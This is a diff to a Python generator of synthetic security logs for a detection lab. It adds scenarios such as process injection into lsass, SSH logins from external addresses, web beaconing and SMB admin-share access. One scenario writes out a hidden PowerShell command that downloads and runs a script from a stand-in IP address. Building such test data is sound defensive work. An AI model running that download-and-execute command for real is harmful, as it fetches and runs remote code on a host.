@@ -78,7 +78,43 @@ SCENARIOS = (
     "data-staging",
     "service-stop",
     "lolbins",
+    "windows-shell",
+    "process-injection",
+    "valid-accounts",
+    "web-beacon",
+    "ssh-lateral",
+    "smb-admin-share",
 )
+
+# Scenario start times are anchors, in hours before the run's base time. The
+# three case scenarios and the baseline stay near the base so their case files
+# remain coherent; the rest are spread across the 24-hour window.
+SCENARIO_HOURS = {
+    "password-spray": 19,
+    "webshell": 17,
+    "psexec-lateral": 15,
+    "new-user": 15,
+    "discovery-burst": 13,
+    "cron-persistence": 13,
+    "cloud-key-creation": 11,
+    "registry-persistence": 11,
+    "smb-admin-share": 10,
+    "wmi-persistence": 10,
+    "port-scan": 9,
+    "dns-tunnel": 8,
+    "exfil-transfer": 7,
+    "web-attack": 6,
+    "uac-bypass": 5,
+    "kerberoasting": 4,
+    "linux-persistence": 3,
+    "data-staging": 2,
+    "lolbins": 1,
+    "windows-shell": 20,
+    "process-injection": 18,
+    "valid-accounts": 16,
+    "web-beacon": 14,
+    "ssh-lateral": 12,
+}
 
 
 def iso(value: datetime) -> str:
@@ -190,6 +226,50 @@ class Lab:
                         "SourceImage": source_image,
                         "TargetImage": target_image,
                         "GrantedAccess": granted_access,
+                    },
+                },
+            }
+        )
+
+    def remote_thread(
+        self,
+        ts: datetime,
+        source_image: str,
+        target_image: str,
+        start_address: str = "0x00007FF6A1B20000",
+        host: str = WINDOWS_HOST,
+    ) -> None:
+        self.windows.append(
+            {
+                "@timestamp": iso(ts),
+                "event": {
+                    "code": "8",
+                    "kind": "event",
+                    "category": ["process"],
+                    "type": ["start"],
+                    "action": "create_remote_thread",
+                    "dataset": "windows.sysmon_operational",
+                    "module": "windows",
+                },
+                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
+                "process": {
+                    "name": ntpath.basename(source_image),
+                    "executable": source_image,
+                    "executable.caseless": source_image.lower(),
+                    "pid": self.rng.randint(1200, 9000),
+                },
+                "winlog": {
+                    "channel": "Microsoft-Windows-Sysmon/Operational",
+                    "event_id": "8",
+                    "computer_name": host,
+                    "provider_name": "Microsoft-Windows-Sysmon",
+                    "event_data": {
+                        "SourceImage": source_image,
+                        "TargetImage": target_image,
+                        "NewThreadId": str(self.rng.randint(1000, 9999)),
+                        "StartAddress": start_address,
+                        "StartModule": r"C:\Windows\System32\ntdll.dll",
+                        "StartFunction": "NtCreateThreadEx",
                     },
                 },
             }
@@ -625,10 +705,10 @@ class Lab:
 # ---------------------------------------------------------------- scenarios
 def scenario_baseline(lab: Lab) -> None:
     """Benign activity that should NOT trigger a detection."""
-    start = lab.base - timedelta(hours=10)
+    start = lab.base - timedelta(hours=23)
     users = ["analyst", "j.tan", "m.okafor", "s.reyes"]
-    for index in range(150):
-        ts = start + timedelta(minutes=index * 4 + lab.rng.randint(0, 2))
+    for index in range(690):
+        ts = start + timedelta(minutes=index * 2 + lab.rng.randint(0, 2))
         user = users[index % len(users)]
         lab.process_creation(
             ts,
@@ -1145,6 +1225,83 @@ def scenario_lolbins(lab: Lab) -> None:
     )
 
 
+def scenario_windows_shell(lab: Lab) -> None:
+    """A command shell launches a hidden PowerShell payload."""
+    start = lab.base - timedelta(minutes=6)
+    lab.process_creation(
+        start,
+        r"C:\Windows\System32\cmd.exe",
+        'cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.44/a.ps1\')"',
+        parent_image=r"C:\Windows\System32\explorer.exe",
+        user=r"LAB\analyst",
+    )
+
+
+def scenario_process_injection(lab: Lab) -> None:
+    """A binary in a user-writable path starts remote threads."""
+    start = lab.base - timedelta(minutes=8)
+    lab.remote_thread(start, r"C:\Users\Public\injector.exe", r"C:\Windows\System32\notepad.exe")
+    lab.remote_thread(
+        start + timedelta(seconds=30),
+        r"C:\Users\Public\injector.exe",
+        r"C:\Windows\System32\lsass.exe",
+        start_address="0x00007FF6A1B24000",
+    )
+
+
+def scenario_valid_accounts(lab: Lab) -> None:
+    """A valid service account logs in from an external address."""
+    start = lab.base - timedelta(minutes=5)
+    message = "Accepted password for backup from 203.0.113.77 port 51555 ssh2"
+    lab.auth_event(start, message, WEB_ATTACKER, "backup", "success")
+    lab.auth_event(start + timedelta(seconds=20), message.replace("51555", "51556"), WEB_ATTACKER, "backup", "success")
+
+
+def scenario_web_beacon(lab: Lab) -> None:
+    """Periodic web requests to a command endpoint."""
+    start = lab.base - timedelta(minutes=9)
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"
+    for index in range(12):
+        lab.web_event(
+            start + timedelta(seconds=index * 20),
+            "GET",
+            "/api/v2/beacon",
+            query=f"session={index:02d}&task=poll",
+            source_ip=WEB_ATTACKER,
+            user_agent=ua,
+        )
+
+
+def scenario_ssh_lateral(lab: Lab) -> None:
+    """Root SSH login from an external address."""
+    start = lab.base - timedelta(minutes=4)
+    lab.auth_event(
+        start,
+        "Accepted password for root from 203.0.113.77 port 51557 ssh2",
+        WEB_ATTACKER,
+        "root",
+        "success",
+    )
+
+
+def scenario_smb_admin_share(lab: Lab) -> None:
+    """SMB access to administrative shares."""
+    start = lab.base - timedelta(minutes=7)
+    shares = [r"\\*\ADMIN$", r"\\*\C$", r"\\*\ADMIN$"]
+    for index, share in enumerate(shares):
+        lab.security_event(
+            start + timedelta(seconds=index * 20),
+            "5140",
+            {
+                "ShareName": share,
+                "SubjectUserName": "administrator",
+                "IpAddress": ATTACKER,
+            },
+            "A network share object was accessed.",
+            host=DC_HOST,
+        )
+
+
 BUILDERS = {
     "baseline": scenario_baseline,
     "ssh-bruteforce": scenario_ssh_bruteforce,
@@ -1174,6 +1331,12 @@ BUILDERS = {
     "data-staging": scenario_data_staging,
     "service-stop": scenario_service_stop,
     "lolbins": scenario_lolbins,
+    "windows-shell": scenario_windows_shell,
+    "process-injection": scenario_process_injection,
+    "valid-accounts": scenario_valid_accounts,
+    "web-beacon": scenario_web_beacon,
+    "ssh-lateral": scenario_ssh_lateral,
+    "smb-admin-share": scenario_smb_admin_share,
 }
 
 
@@ -1181,8 +1344,22 @@ def generate(scenario: str, seed: int = 1337, base_time: datetime | None = None)
     base_time = base_time or datetime.now(timezone.utc)
     lab = Lab(base_time, seed=seed)
     selected = SCENARIOS if scenario == "all" else (scenario,)
-    for name in selected:
-        BUILDERS[name](lab)
+
+    if scenario == "all":
+        for index, name in enumerate(selected):
+            offset_hours = SCENARIO_HOURS.get(name, 0)
+            if not offset_hours:
+                BUILDERS[name](lab)
+                continue
+            # Each scheduled scenario gets its own deterministic RNG stream so
+            # moving one scenario cannot silently rewrite the timestamps or PIDs
+            # of another.
+            shifted = Lab(base_time - timedelta(hours=offset_hours), seed=seed + index * 97)
+            BUILDERS[name](shifted)
+            for attr in ("windows", "linux", "web", "cloud", "network"):
+                getattr(lab, attr).extend(getattr(shifted, attr))
+    else:
+        BUILDERS[scenario](lab)
 
     for events in (lab.windows, lab.linux, lab.web, lab.cloud, lab.network):
         events.sort(key=lambda event: event["@timestamp"])
